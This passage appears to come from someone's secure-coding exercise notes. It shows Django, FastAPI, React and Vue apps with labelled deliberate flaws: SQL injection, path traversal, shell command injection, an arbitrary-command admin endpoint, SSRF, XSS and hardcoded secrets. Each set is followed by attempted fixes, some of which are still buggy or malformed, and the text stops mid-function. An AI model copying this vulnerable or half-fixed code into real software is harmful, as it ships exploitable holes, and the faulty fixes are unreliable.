			return JsonResponse({'error': 'not authenticated'}, status=401)

		try:
			payload = jwt.decode(	

						token,

						COOKIE_KEY,

						algorithms=['HS256'],

						issuer="issuer_here",

						audience="audience_here"

			)
		
		except Exception:

			return JsonResponse({'error': 'not authenticated'}, status=401)
		
		avatar_url = request.POST.get('avatar_url', '')
	
		user_id = request.POST.get('user_id')

		if payload['user_id'] != user_id:
			
			return JsonResponse({'error': 'not authorized'}, status=404)

			
	
		# SSRF Bug Below

		allowlist_urls = ['first_allow.com','second_allow.com']

		if not is_valid_url(avatar_url,allowlist_urls):

			return JsonResponse({'error': 'avatar NOT updated'}, status=405)

		response = requests.get(avatar_url,allow_redirects=False,timeout=5)
		
		# OS Path Traversal Vulnerability Below
		
		base_dir = os.path.abspath('media/avatars')

		pwd_file = os.path.abspath(os.path.join(base_dir,f'{user_id}_avatar.png'))

		if not pwd_file.startswith(base_dir + os.sep):

			return JsonResponse({'error': 'avatar NOT updated'}, status=405)

		with open(pwd_file, 'wb') as f:

			f.write(response.content)

		profile = UserProfile.objects.get(user_id=user_id)

		profile.avatar_url = pwd_file

		profile.save()

		return JsonResponse({'status': 'avatar updated'})

	return JsonResponse({'error': 'invalid method'}, status=405)

@ratelimit(key='ip',rate='5/m')
def search_reports(request):
	q = request.GET.get('q', '')
	with connection.cursor() as cursor:

		# SQL Injection Vulnerability Below

		cursor.execute(
			f"SELECT id, title, content FROM dashboard_report WHERE title LIKE %s",('%' + q + '%',)
		)

		rows = cursor.fetchall()

	return JsonResponse({'results': rows})

@csrf_protect
@ratelimit(key='ip',rate='5/m')
def get_report(request, report_id):

	# Authenticate the user first before getting the report
	
	token = request.COOKIES.get('report_token')

	if not token:

		return JsonResponse({'error': 'not authenticated'}, status=401)

	try:
        	payload = jwt.decode(	

					token,

					COOKIE_KEY,

					algorithms=['HS256'],

					issuer="issuer_here",

					audience="audience_here"

		)
	
	except Exception:

		return JsonResponse({'error': 'not authenticated'}, status=401)
	
	report = get_object_or_404(Report, id=report_id)

	if payload['username'] != report.owner.username:
		
		return JsonResponse({'error': 'not authorized'},status=404)

		

	return JsonResponse({
		'id': report.id,
		'title': report.title,
		'content': report.content,
		'owner': report.owner.username
	})
		

@ratelimit(key='ip',rate='5/m')
def run_diagnostic(request):
	if request.method == 'POST':
		target = request.POST.get('target', '')

		# OS Command Injection Bug Below

		target_sanitize = shlex.quote(target)

		cmd = 'dig +short ' + target_sanitize

		cmd_list = shlex.split(cmd)

		result = subprocess.run(
			cmd_list,
			shell=False,
			capture_output=True,
			text=True
		)
		return JsonResponse({'output': result.stdout})
	return JsonResponse({'error': 'invalid method'}, status=405)

@csrf_protect
@ratelimit(key='ip',rate='5/m')
def admin_users(request):

	token = request.COOKIES.get('report_token')

	if not token:

		return JsonResponse({'error': 'not authenticated'}, status=401)

	try:
        	payload = jwt.decode(	

					token,

					COOKIE_KEY,

					algorithms=['HS256'],

					issuer="issuer_here",

					audience="audience_here"

		)
	
	except Exception:

		return JsonResponse({'error': 'not authenticated'}, status=401)

	if payload['role'] != 'admin':
		
		return JsonResponse({'error': 'not authorized'},status=404)

		
	
	users = User.objects.values('id', 'username', 'email', 'is_staff')

	return JsonResponse({'users': list(users)})
```

`dashboard/urls.py`

```
from django.urls import path
from . import views

urlpatterns = [
	path('avatar/set/', views.set_avatar),
	path('reports/search/', views.search_reports),
	path('reports/<int:report_id>/', views.get_report),
	path('diagnostic/', views.run_diagnostic),
	path('admin/users/', views.admin_users),
]
```

`templates/dashboard.html`

```
<!DOCTYPE html>
<html>
<head><title>DevDash</title></head>
<body>
<div x-data="dashboard()" x-init="init()">

	<div>
		<h2>Update Avatar</h2>
		<input
			type="text"
			x-model="avatarUrl"
			placeholder="Paste image URL..."
		/>
		<input
			type="text"
			x-model="userId"
			placeholder="User ID..."
		/>
		<button @click="setAvatar()">Update</button>
		<img :src="avatarPreview" x-show="avatarPreview" />
	</div>

	<div>
		<h2>Search Reports</h2>
		<input
			type="text"
			x-model="searchQuery"
			placeholder="Search..."
		/>
		<button @click="searchReports()">Search</button>
		<div x-text="searchResults"></div>
	</div>

	<div>
		<h2>DNS Diagnostic</h2>
		<input
			type="text"
			x-model="diagTarget"
			placeholder="Enter hostname..."
		/>
		<button @click="runDiagnostic()">Run</button>
		<pre x-text="diagOutput"></pre>
	</div>

</div>

<script>
function dashboard() {
	return {
		avatarUrl: '',
		userId: '',
		avatarPreview: '',
		searchQuery: '',
		searchResults: '',
		diagTarget: '',
		diagOutput: '',

		async setAvatar() {
			const res = await fetch('/avatar/set/', {
				method: 'POST',
				headers: { 'Content-Type': 'application/x-www-form-urlencoded' },

				body: `avatar_url=${this.avatarUrl}&user_id=${this.userId}`
			});
			const data = await res.json();
			this.avatarPreview = this.avatarUrl;
		},

		async searchReports() {


			const res = await fetch(`/reports/search/?q=${this.searchQuery}`);
			const data = await res.json();
			this.searchResults = data.results;
		},

		async runDiagnostic() {
			const res = await fetch('/diagnostic/', {
				method: 'POST',
				headers: { 'Content-Type': 'application/x-www-form-urlencoded' },

				body: `target=${this.diagTarget}`
			});
			const data = await res.json();
			this.diagOutput = data.output;
		},

		init() {}
	}
}
</script>
<script src="//cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
</body>
</html>
```

Exercise 5:

`invoicehub/settings.py`:

```
# Hardcoding Secrets
SECRET_KEY = 'invoice-secret-key-hardcoded-9876'

# Debug mode NEVER should be True
DEBUG = True
ALLOWED_HOSTS = ['*']

INSTALLED_APPS = [
	'django.contrib.admin',
	'django.contrib.auth',
	'django.contrib.contenttypes',
	'django.contrib.sessions',
	'django.contrib.messages',
	'django.contrib.staticfiles',
	'billing',
]

MIDDLEWARE = [
	'django.middleware.security.SecurityMiddleware',
	'django.contrib.sessions.middleware.SessionMiddleware',
	'django.middleware.common.CommonMiddleware',
	'django.contrib.auth.middleware.AuthenticationMiddleware',
	'django.contrib.messages.middleware.MessageMiddleware',
]
```

`billing/models.py`:

```
from django.db import models
from django.contrib.auth.models import User

class Invoice(models.Model):
	title = models.CharField(max_length=200)
	amount = models.DecimalField(max_digits=10, decimal_places=2)
	pdf_filename = models.CharField(max_length=300)
	# Watch out for Access Control!
	owner = models.ForeignKey(User, on_delete=models.CASCADE)
	created_at = models.DateTimeField(auto_now_add=True)

class APIKey(models.Model):
	key = models.CharField(max_length=64, unique=True)
	# Watch out for Access Control!
	owner = models.ForeignKey(User, on_delete=models.CASCADE)
	is_active = models.BooleanField(default=True)
	created_at = models.DateTimeField(auto_now_add=True)
```

`billing/views.py`

```
# No Rate Limiting
from django.http import JsonResponse, FileResponse
from django.contrib.auth.models import User
from django.db import connection
import subprocess
import os
import jwt
import requests
from .models import Invoice, APIKey

def get_invoices(request):

	# No Authentication or Authorization

	api_key = request.headers.get('X-API-Key', '')
	key_obj = APIKey.objects.filter(key=api_key).first()
	owner_id = key_obj.owner_id if key_obj else None
	with connection.cursor() as cursor:
		
		# SQL Injection Vulnerability

		cursor.execute(
			f"SELECT id, title, amount, pdf_filename FROM billing_invoice WHERE owner_id = {owner_id}"
		)
		rows = cursor.fetchall()
	return JsonResponse({'invoices': rows})

def download_invoice(request):
	# No Authentication or Authorization

	filename = request.GET.get('file', '')

	# OS Path Traversal Attack

	filepath = os.path.join('/var/invoices', filename)

	return FileResponse(open(filepath, 'rb'))

def health_check(request):
	# No Authentication or Authorization
	host = request.GET.get('host', 'localhost')


	# Server Side Request Forgery Vulnerability Below

	# No restrictions on which URL curl visits

	result = subprocess.run(
		f'curl -s --max-time 3 {host}',
		shell=True,
		capture_output=True,
		text=True
	)
	return JsonResponse({'status': result.stdout})

def get_invoice(request, invoice_id):
	# No Authentication or Authorization
	with connection.cursor() as cursor:

		# SQL Injection Vulnerability Below

		cursor.execute(
			f"SELECT id, title, amount, pdf_filename, owner_id FROM billing_invoice WHERE id = {invoice_id}"
		)

		row = cursor.fetchone()

	if not row:
		return JsonResponse({'error': 'not found'}, status=404)
	return JsonResponse({
		'id': row[0],
		'title': row[1],
		'amount': str(row[2]),
		'pdf_filename': row[3]
	})

def create_api_key(request):
	
	# No Authentication 

	if request.method == 'POST':
		import secrets
		user_id = request.POST.get('user_id')
		key = secrets.token_hex(32)
		APIKey.objects.create(key=key, owner_id=user_id)
		return JsonResponse({'api_key': key})
	return JsonResponse({'error': 'invalid method'}, status=405)
```

`billing/urls.py`

```
from django.urls import path
from . import views

urlpatterns = [
	path('invoices/', views.get_invoices),
	# IDOR Vulnerability Below
	path('invoices/<int:invoice_id>/', views.get_invoice),
	path('invoices/download/', views.download_invoice),
	path('admin/health/', views.health_check),
	path('keys/create/', views.create_api_key),
]
```

`components/InvoiceDashboard.tsx`

```
'use client';
import { useState } from 'react';

export default function InvoiceDashboard() {
	const [invoices, setInvoices] = useState([]);
	const [searchHtml, setSearchHtml] = useState('');
	const [host, setHost] = useState('');
	const [healthResult, setHealthResult] = useState('');

	const loadInvoices = async () => {
		const apiKey = localStorage.getItem('api_key');
		const res = await fetch('/api/invoices/', {
			headers: { 'X-API-Key': apiKey || '' }
		});
		const data = await res.json();
		setInvoices(data.invoices);
	};

	const searchInvoices = async (query: string) => {
		const res = await fetch(`/api/invoices/?search=${query}`);
		const html = await res.text();

		setSearchHtml(html);
	};

	const checkHealth = async () => {
		const res = await fetch(`/api/admin/health/?host=${host}`);
		const data = await res.json();
		setHealthResult(data.status);
	};

	const downloadInvoice = (filename: string) => {
	
		# XSS Vulnerability Below
		window.location.href = `/api/invoices/download/?file=${filename}`;
	};

	return (
		<div>
			<button onClick={loadInvoices}>Load Invoices</button>
			<ul>
				{invoices.map((inv: any) => (
					<li key={inv[0]}>
						{inv[1]} - ${inv[2]}
						<button onClick={() => downloadInvoice(inv[3])}>Download PDF</button>
					</li>
				))}
			</ul>

			<div>
				<input
					placeholder="Search invoices..."
					onChange={(e) => searchInvoices(e.target.value)}
				/>

				# DOM XSS Vulnerability Below

				<div dangerouslySetInnerHTML={{ __html: searchHtml }} />
			</div>

			<div>
				<input
					value={host}
					onChange={(e) => setHost(e.target.value)}
					placeholder="Health check host..."
				/>
				<button onClick={checkHealth}>Check</button>
				<pre>{healthResult}</pre>
			</div>
		</div>
	);
}
```

Below is the fixed code:

`invoicehub/settings.py`:

```
import os
from dotenv import load_dotenv

load_dotenv()

# Hardcoding Secrets
SECRET_KEY = os.getenv('SECRET_KEY')

# Debug mode NEVER should be True
DEBUG = False
ALLOWED_HOSTS = ['first_domain.com','second_domain.com']

INSTALLED_APPS = [
	'django.contrib.admin',
	'django.contrib.auth',
	'django.contrib.contenttypes',
	'django.contrib.sessions',
	'django.contrib.messages',
	'django.contrib.staticfiles',
	'billing',
]

MIDDLEWARE = [
	'django.middleware.security.SecurityMiddleware',
	'django.contrib.sessions.middleware.SessionMiddleware',
	'django.middleware.common.CommonMiddleware',
	'django.contrib.auth.middleware.AuthenticationMiddleware',
	'django.contrib.messages.middleware.MessageMiddleware',
]

SECURE_SSL_REDIRECT = True
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True
```

`billing/models.py`:

```
from django.db import models
from django.contrib.auth.models import User

class Invoice(models.Model):
	title = models.CharField(max_length=200)
	amount = models.DecimalField(max_digits=10, decimal_places=2)
	pdf_filename = models.CharField(max_length=300)
	# Watch out for Access Control!
	owner = models.ForeignKey(User, on_delete=models.CASCADE)
	created_at = models.DateTimeField(auto_now_add=True)

class APIKey(models.Model):
	key = models.CharField(max_length=64, unique=True)
	# Watch out for Access Control!
	owner = models.ForeignKey(User, on_delete=models.CASCADE)
	is_active = models.BooleanField(default=True)
	created_at = models.DateTimeField(auto_now_add=True)
```

`billing/views.py`

```
# No Rate Limiting
from django.http import JsonResponse, FileResponse
from django.contrib.auth.models import User
from django.db import connection
import shlex
import secrets
import subprocess
import jwt
import os
import requests
from .models import Invoice, APIKey
from django_ratelimit.decorators import ratelimit
from urllib.parse import urlparse

from dotenv import load_dotenv

load_dotenv()

# Hardcoding Secrets

COOKIE_KEY = os.getenv('COOKIE_KEY')


from django.views.decorators.csrf import csrf_protect

@csrf_protect
@ratelimit(key='ip', rate='5/m')
def get_invoices(request):

	# No Authentication or Authorization
	
	token = request.COOKIES.get('report_token')

	if not token:

		return JsonResponse({'error': 'not authenticated'}, status=401)

	try:
        	payload = jwt.decode(	

					token,

					COOKIE_KEY,

					algorithms=['HS256'],

					issuer="issuer_here",

					audience="audience_here"

		)
	
	except Exception:

		return JsonResponse({'error': 'not authenticated'}, status=401)

	api_key = request.headers.get('X-API-Key', '')

	key_obj = APIKey.objects.filter(key=api_key).first()

	owner_id = key_obj.owner_id if key_obj else None

	if not owner_id or payload['owner_id'] != owner_id:
		
		return JsonResponse({'error': 'not authorized'},status=404)

	with connection.cursor() as cursor:
		
		# SQL Injection Vulnerability
		
		cursor.execute(
			f"SELECT id, title, amount, pdf_filename FROM billing_invoice WHERE owner_id = %s",(owner_id,)
		)

		rows = cursor.fetchall()

	return JsonResponse({'invoices': rows})

@csrf_protect
@ratelimit(key='ip', rate='5/m')
def download_invoice(request):
	# No Authentication or Authorization
	
	token = request.COOKIES.get('report_token')

	if not token:

		return JsonResponse({'error': 'not authenticated'}, status=401)

	try:
        	payload = jwt.decode(	

					token,

					COOKIE_KEY,

					algorithms=['HS256'],

					issuer="issuer_here",

					audience="audience_here"

		)
	
	except Exception:

		return JsonResponse({'error': 'not authenticated'}, status=401)

	api_key = request.headers.get('X-API-Key', '')

	key_obj = APIKey.objects.filter(key=api_key).first()

	owner_id = key_obj.owner_id if key_obj else None

	if not owner_id or payload['owner_id'] != owner_id:
		
		return JsonResponse({'error': 'not authorized'},status=404)

	filename = request.GET.get('file', '')

	# OS Path Traversal Attack

	base_dir = os.path.abspath('/var/invoices')

	pwd_file = os.path.abspath(os.path.join(base_dir,filename))

	if not pwd_file.startswith(base_dir + os.sep):

		return JsonResponse({'error': 'not authorized'},status=404)

	return FileResponse(open(pwd_file, 'rb'))



def is_valid_url(url: str,allow_list: list[str]) -> bool:

	parsed = urlparse(url)

	netloc = parsed.netloc

	hostname = netloc.split(':')[0]

	return hostname in allow_list


@csrf_protect
@ratelimit(key='ip', rate='5/m')
def health_check(request):
	
	# No Authentication or Authorization
	
	token = request.COOKIES.get('report_token')

	if not token:

		return JsonResponse({'error': 'not authenticated'}, status=401)

	try:
        	payload = jwt.decode(	

					token,

					COOKIE_KEY,

					algorithms=['HS256'],

					issuer="issuer_here",

					audience="audience_here"

		)
	
	except Exception:

		return JsonResponse({'error': 'not authenticated'}, status=401)

	if payload['role'] != 'admin':
		
		return JsonResponse({'error': 'not authorized'},status=404)

	host = request.GET.get('host', 'localhost')

	# Server Side Request Forgery Vulnerability

	allowlist = ['first.com','second.com']

	if not is_valid_url(host,allowlist):

		return JsonResponse({'error': 'not authorized'},status=404)

	host_sanitize = shlex.quote(host)

	argument = 'curl -s --max-time 3 '

	argument += host_sanitize

	cmd_list = shlex.split(argument)	

	result = subprocess.run(
		cmd_list,
		shell=False,
		capture_output=True,
		text=True
	)

	return JsonResponse({'status': result.stdout})


@csrf_protect
@ratelimit(key='ip', rate='5/m')
def get_invoice(request, invoice_id):
	
	# No Authentication

	token = request.COOKIES.get('report_token')

	if not token:

		return JsonResponse({'error': 'not authenticated'}, status=401)

	try:
        	payload = jwt.decode(	

					token,

					COOKIE_KEY,

					algorithms=['HS256'],

					issuer="issuer_here",

					audience="audience_here"

		)
	
	except Exception:

		return JsonResponse({'error': 'not authenticated'}, status=401)

	api_key = request.headers.get('X-API-Key', '')

	key_obj = APIKey.objects.filter(key=api_key).first()

	owner_id = key_obj.owner_id if key_obj else None

	if not owner_id or payload['owner_id'] != owner_id:
		
		return JsonResponse({'error': 'not authorized'},status=404)

	with connection.cursor() as cursor:

		# SQL Injection Vulnerability Below
		
		cursor.execute(
			f"SELECT id, title, amount, pdf_filename, owner_id FROM billing_invoice WHERE id = %s",(invoice_id,)
		)

		row = cursor.fetchone()

	if not row or row[4] != owner_id:

		return JsonResponse({'error': 'not found'}, status=404)

	return JsonResponse({
		'id': row[0],
		'title': row[1],
		'amount': str(row[2]),
		'pdf_filename': row[3]
	})

# Stuck Here
@csrf_protect
@ratelimit(key='ip', rate='5/m')
def create_api_key(request):
	
	# No Authentication 

	token = request.COOKIES.get('report_token')

	if not token:

		return JsonResponse({'error': 'not authenticated'}, status=401)

	try:
        	payload = jwt.decode(	

					token,

					COOKIE_KEY,

					algorithms=['HS256'],

					issuer="issuer_here",

					audience="audience_here"

		)
	
	except Exception:

		return JsonResponse({'error': 'not authenticated'}, status=401)

	if request.method == 'POST':

		user_id = 0

		try:

		    user_id = int(request.POST.get('user_id', ''))

		except ValueError:

		    return JsonResponse({'error': 'invalid user_id'}, status=400)


		if payload['user_id'] != user_id:

			return JsonResponse({'error': 'not authorized'},status=404)
		
		key = secrets.token_hex(32)

		APIKey.objects.create(key=key, owner_id=user_id)

		return JsonResponse({'api_key': key})

	return JsonResponse({'error': 'invalid method'}, status=405)
```

`billing/urls.py`

```
from django.urls import path
from . import views

urlpatterns = [
	path('invoices/', views.get_invoices),
	# IDOR Vulnerability Below
	path('invoices/<int:invoice_id>/', views.get_invoice),
	path('invoices/download/', views.download_invoice),
	path('admin/health/', views.health_check),
	path('keys/create/', views.create_api_key),
]
```

`components/InvoiceDashboard.tsx`

```
'use client';
import { useState } from 'react';

export default function InvoiceDashboard() {
	const [invoices, setInvoices] = useState([]);
	const [searchHtml, setSearchHtml] = useState('');
	const [host, setHost] = useState('');
	const [healthResult, setHealthResult] = useState('');

	const loadInvoices = async () => {
		const apiKey = localStorage.getItem('api_key');
		const res = await fetch('/api/invoices/', {
			headers: { 'X-API-Key': apiKey || '' }
		});
		const data = await res.json();
		setInvoices(data.invoices);
	};

	const searchInvoices = async (query: string) => {
		const res = await fetch(`/api/invoices/?search=${query}`);
		const html = await res.text();

		setSearchHtml(html);
	};

	const checkHealth = async () => {
		const res = await fetch(`/api/admin/health/?host=${host}`);
		const data = await res.json();
		setHealthResult(data.status);
	};

	const downloadInvoice = (filename: string) => {
	
		// OS Path Traversal Vulnerability Below

		window.location.href = `/api/invoices/download/?file=${encodeURIComponent(filename)}`;
	};

	return (
		<div>
			<button onClick={loadInvoices}>Load Invoices</button>
			<ul>
				{invoices.map((inv: any) => (
					<li key={inv[0]}>
						{inv[1]} - ${inv[2]}
						<button onClick={() => downloadInvoice(inv[3])}>Download PDF</button>
					</li>
				))}
			</ul>

			<div>
				<input
					placeholder="Search invoices..."
					onChange={(e) => searchInvoices(e.target.value)}
				/>

				{/* DOM XSS Vulnerability Below */}

				<div>{searchHtml}</div>
			</div>

			<div>
				<input
					value={host}
					onChange={(e) => setHost(e.target.value)}
					placeholder="Health check host..."
				/>
				<button onClick={checkHealth}>Check</button>
				<pre>{healthResult}</pre>
			</div>
		</div>
	);
}
```

Exercise 6:

`app/models.py`

```
from sqlalchemy import Column, Integer, String, Text, Boolean, ForeignKey
from sqlalchemy.ext.declarative import declarative_base

Base = declarative_base()

class User(Base):
	__tablename__ = 'users'
	id = Column(Integer, primary_key=True)
	username = Column(String(100), unique=True)
	password_hash = Column(String(256))
	role = Column(String(20), default='member')
	api_token = Column(String(64))

class Document(Base):
	__tablename__ = 'documents'
	id = Column(Integer, primary_key=True)
	title = Column(String(200))
	content = Column(Text)
	owner_id = Column(Integer, ForeignKey('users.id'))
	is_public = Column(Boolean, default=False)

class Workspace(Base):
	__tablename__ = 'workspaces'
	id = Column(Integer, primary_key=True)
	name = Column(String(200))
	owner_id = Column(Integer, ForeignKey('users.id'))
	webhook_url = Column(String(500))
```

`app/main.py`

```
from fastapi import FastAPI, Request, Header, UploadFile, File, Depends
from fastapi.responses import FileResponse
from sqlalchemy.orm import Session
from sqlalchemy import text
import subprocess
import httpx
import os
import sqlite3

app = FastAPI()

DATABASE_URL = "sqlite:///./teamcollab.db"

# NEVER Hardcode Secrets Below

SECRET_KEY = "teamcollab-secret-hardcoded-2024"

UPLOAD_DIR = "uploads"

def get_db():
	conn = sqlite3.connect("teamcollab.db")
	try:
		yield conn
	finally:
		conn.close()

@app.get("/documents/search")
async def search_documents(q: str, db: sqlite3.Connection = Depends(get_db)):

	# No Authentication nor Authorization

	cursor = db.cursor()

	# SQL Injection Vulnerability Below

	cursor.execute(
		f"SELECT id, title, content, owner_id FROM documents WHERE title LIKE '%{q}%' OR content LIKE '%{q}%'"
	)
	return {"results": cursor.fetchall()}

#IDOR Vulnerability Below
@app.get("/documents/{doc_id}")
async def get_document(doc_id: int, x_api_token: str = Header(None), db: sqlite3.Connection = Depends(get_db)):

	
	# No Authentication nor Authorization

	cursor = db.cursor()
	
	# SQL Injection Vulnerability Below

	# Remember to Verify owner_id

	cursor.execute(f"SELECT id, title, content, owner_id, is_public FROM documents WHERE id = {doc_id}")
	doc = cursor.fetchone()
	if not doc:
		return {"error": "not found"}, 404
	return {"id": doc[0], "title": doc[1], "content": doc[2]}

#IDOR Vulnerability Below

@app.post("/workspaces/{workspace_id}/notify")
async def notify_workspace(workspace_id: int, payload: dict, db: sqlite3.Connection = Depends(get_db)):
	# No Authentication nor Authorization

	cursor = db.cursor()
	
	# SQL Injection Vulnerability

	cursor.execute(f"SELECT webhook_url FROM workspaces WHERE id = {workspace_id}")

	row = cursor.fetchone()
	if not row:
		return {"error": "not found"}
	webhook_url = row[0]
	async with httpx.AsyncClient() as client:
		await client.post(webhook_url, json=payload)
	return {"status": "notified"}

@app.post("/upload")
async def upload_file(file: UploadFile = File(...), x_api_token: str = Header(None)):

	# No Authentication nor Authorization Below

	# OS Path Traversal Vulnerability Below

	dest = os.path.join(UPLOAD_DIR, file.filename)
	with open(dest, "wb") as f:
		content = await file.read()
		f.write(content)
	return {"path": dest}

@app.get("/admin/run")
async def run_command(cmd: str, x_api_token: str = Header(None)):

	# No Authentication nor Authorization Below

	# Remember to check if the person has the role 'admin'

	# OS Command Injection Vulnerability Below

	result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
	return {"output": result.stdout}

@app.post("/auth/login")
async def login(username: str, password: str, db: sqlite3.Connection = Depends(get_db)):

	# No Authentication nor Authorization Below

	cursor = db.cursor()

	# SQL Injection Vulnerability Below

	cursor.execute(
		f"SELECT id, username, role, api_token FROM users WHERE username = '{username}' AND password_hash = '{password}'"
	)
	user = cursor.fetchone()
	if not user:
		return {"error": "invalid credentials"}
	return {"api_token": user[3], "role": user[2]}
```

`pages/documents.vue`

```
<template>
	<div>
		<input v-model="searchQuery" @input="search" placeholder="Search documents..." />
		<div v-html="searchResults"></div>

		<div v-for="doc in documents" :key="doc.id">
			<h3>{{ doc.title }}</h3>
			<div v-html="doc.content"></div>
			<button @click="downloadDoc(doc.id)">Download</button>
		</div>

		<div>
			<input v-model="webhookPayload" placeholder="Webhook payload..." />
			<button @click="triggerWebhook">Send Webhook</button>
		</div>
	</div>
</template>

<script setup>
import { ref } from 'vue'

const searchQuery = ref('')
const searchResults = ref('')
const documents = ref([])
const webhookPayload = ref('')

const apiToken = localStorage.getItem('api_token')

const search = async () => {
	
	const res = await fetch(`/api/documents/search?q=${searchQuery.value}`)
	const html = await res.text()
	searchResults.value = html
}

const downloadDoc = (id) => {

	// Missing URL-Encoding
	window.location.href = `/api/documents/${id}/download?token=${apiToken}`
}

const triggerWebhook = async () => {
	await fetch('/api/workspaces/1/notify', {
		method: 'POST',
		headers: { 'Content-Type': 'application/json' },
		body: webhookPayload.value
	})
}
</script>
```

Below is the fixed code for Exercise 6:


`app/models.py`

```
from sqlalchemy import Column, Integer, String, Text, Boolean, ForeignKey
from sqlalchemy.ext.declarative import declarative_base

Base = declarative_base()

class User(Base):
	__tablename__ = 'users'
	id = Column(Integer, primary_key=True)
	username = Column(String(100), unique=True)
	password_hash = Column(String(256))
	role = Column(String(20), default='member')
	api_token = Column(String(64))

class Document(Base):
	__tablename__ = 'documents'
	id = Column(Integer, primary_key=True)
	title = Column(String(200))
	content = Column(Text)
	owner_id = Column(Integer, ForeignKey('users.id'))
	is_public = Column(Boolean, default=False)

class Workspace(Base):
	__tablename__ = 'workspaces'
	id = Column(Integer, primary_key=True)
	name = Column(String(200))
	owner_id = Column(Integer, ForeignKey('users.id'))
	webhook_url = Column(String(500))
```

`app/main.py`

```
# No Rate Limiting

from fastapi import FastAPI, Request, Header, UploadFile, File, Depends
from fastapi.responses import FileResponse, JSONResponse
from fastapi.security import HTTPBearer
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded
from starlette_csrf import CSRFMiddleware
from sqlalchemy.orm import Session
from sqlalchemy import text
from urllib.parse import urlparse
from dotenv import load_dotenv
from passlib.hash import argon2
import subprocess
import httpx
import shlex
import jwt
import os
import sqlite3


limiter = Limiter(key_func=get_remote_address)

app = FastAPI()

app.state.limiter = limiter

app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

security = HTTPBearer()

app.add_middleware(CSRFMiddleware, secret=os.getenv("CSRF_SECRET"))

DATABASE_URL = "sqlite:///./teamcollab.db"

# NEVER Hardcode Secrets Below

env_path = '.env'

load_dotenv()


SECRET_KEY = os.getenv('SECRET_KEY') 

UPLOAD_DIR = "uploads"

def get_db():
	conn = sqlite3.connect("teamcollab.db")
	try:
		yield conn
	finally:
		conn.close()

@app.get("/documents/search")
@limiter.limit("5/minute")
async def search_documents(request: Request,q: str, db: sqlite3.Connection = Depends(get_db)):

	# No Authentication nor Authorization

	token = request.cookies.get('session')

	if not token:
        
		return JSONResponse({'error': 'not authenticated'},status_code=401)

    	try:
        	payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])

	except Exception:

        	return JSONResponse({'error': 'invalid token'},status_code=401)

	cursor = db.cursor()

	# SQL Injection Vulnerability Below

	
	cursor.execute(
		f"SELECT id, title, content, owner_id FROM documents WHERE owner_id = :owner_id",{"owner_id": payload['owner_id']}
	)

	rows = cursor.fetchall()

	if not rows or payload['owner_id'] != int(rows[3]):

        	return JSONResponse({'error': 'unauthorized'},status_code=404)
		

	return {"results": cursor.fetchall()}

#IDOR Vulnerability Below
@app.get("/documents/{doc_id}")
@limiter.limit("5/minute")
async def get_document(request: Request,doc_id: int, x_api_token: str = Header(None), db: sqlite3.Connection = Depends(get_db)):

	# No Authentication nor Authorization
	
	token = request.cookies.get('session')

	if not token:
        
		return JSONResponse({'error': 'not authenticated'},status_code=401)

    	try:
        	payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])

	except Exception:

        	return JSONResponse({'error': 'invalid token'},status_code=401)

	cursor = db.cursor()
	
	# SQL Injection Vulnerability Below

	# Remember to Verify owner_id
	
	cursor.execute(f"SELECT id, title, content, owner_id, is_public
FROM documents WHERE id = :doc_id",{"doc_id": doc_id})
	
	doc = cursor.fetchone()

	if not doc or payload['owner_id'] != int(doc[3]):
		return {"error": "not authorized"}, 404

	return {"id": doc[0], "title": doc[1], "content": doc[2]}

#IDOR Vulnerability Below


def is_valid_url(url: str,allow_list: list[str]) -> bool:

	parsed = urlparse(url)

	netloc = parsed.netloc

	hostname = netloc.split(':')[0]

	return hostname in allow_list

@app.post("/workspaces/{workspace_id}/notify")
@limiter.limit("5/minute")
async def notify_workspace(request: Request,workspace_id: int, payload: dict, db: sqlite3.Connection = Depends(get_db)):
	# No Authentication nor Authorization
	
	token = request.cookies.get('session')

	if not token:
        
		return JSONResponse({'error': 'not authenticated'},status_code=401)

    	try:
        	jwt_payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])

	except Exception:

        	return JSONResponse({'error': 'invalid token'},status_code=401)

	cursor = db.cursor()
	
	# SQL Injection Vulnerability
	
	cursor.execute(f"SELECT webhook_url,owner_id FROM workspaces WHERE id = :workspace_id",{"workspace_id": workspace_id})

	row = cursor.fetchone()

	if not row or jwt_payload['owner_id'] != int(row[1]):
		return {"error": "not authorized"},404

	webhook_url = row[0]

	allowlist_domains = ['first.com','second.com']

	async with httpx.AsyncClient() as client:

		if not is_valid_url(webhook_url,allowlist_domains):

			return {"error": "not authorized"},404
			
		await client.post(webhook_url, json=payload)

	return {"status": "notified"}

@app.post("/upload")
@limiter.limit("5/minute")
async def upload_file(request: Request,file: UploadFile = File(...), x_api_token: str = Header(None)):

	# No Authentication nor Authorization Below
	
	token = request.cookies.get('session')
	
	if not token:
        
		return JSONResponse({'error': 'not authenticated'},status_code=401)

    	try:
        	payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])

	except Exception:

        	return JSONResponse({'error': 'invalid token'},status_code=401)

	# OS Path Traversal Vulnerability Below

	base_dir = os.path.abspath(UPLOAD_DIR)

	pwd_file = os.path.abspath(os.path.join(base_dir,file.filename))

	if not pwd_file.startswith(base_dir + os.sep):

		return JSONResponse({'error': 'file not found'},status_code=404)

	with open(pwd_file, "wb") as f:

		content = await file.read()

		f.write(content)
	
	return {"path": pwd_file}

@app.get("/admin/run")
@limiter.limit("5/minute")
async def run_command(request: Request,cmd: str, x_api_token: str = Header(None),db: sqlite3.Connection = Depends(get_db)):

	# No Authentication nor Authorization Below
	
	token = request.cookies.get('session')
	
	if not token:
        
		return JSONResponse({'error': 'not authenticated'},status_code=401)

    	try:
        	payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])

	except Exception:

        	return JSONResponse({'error': 'invalid token'},status_code=401)


	# Remember to check if the person has the role 'admin'

	username = payload['username']

	cursor = db.cursor()
	
	cursor.execute(f"SELECT role FROM users WHERE username = :username",{"username": username})
	row = cursor.fetchone()

	if not row or row[0] != 'admin':

		return {"error": "not authorized"},404

	# OS Command Injection Vulnerability Below

	cmd_split = shlex.split(cmd)

